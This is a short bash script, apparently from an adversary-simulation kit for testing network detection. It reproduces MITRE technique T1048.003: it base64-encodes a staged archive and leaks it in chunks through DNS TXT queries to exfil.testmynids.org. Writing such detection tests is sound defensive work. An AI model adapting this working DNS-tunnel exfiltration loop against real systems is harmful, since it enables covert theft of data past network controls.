#!/usr/bin/env bash
# T1048.003 — Exfiltrate staged data over DNS tunnel
# Derived verbatim from SIM-MP-003 step step-03 (../../mp-003-data-staged-exfil-dns-tunnel.yml).
# LEGAL: run only in an authorized, isolated lab. See ../README.md.
set -u -o pipefail
echo "[SIM-MP-003/T1048.003] Exfiltrate staged data over DNS tunnel"

echo '[MP-003] NDR: DNS tunneling exfiltration - high volume + high entropy';
B64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000);
chunks=$((${#B64} / 60));
for i in $(seq 0 $chunks); do
  chunk=$(echo -n "$B64" | cut -c$((i*60+1))-$(((i+1)*60)));
  [ -z "$chunk" ] && break;
  dig +short TXT "$(echo -n "$chunk" | tr -d = | tr '/+' '-_').exfil.testmynids.org" @1.1.1.1 > /dev/null || true;
  sleep 0.5;
done;
echo "[*] Exfiltrated $chunks DNS TXT chunks"
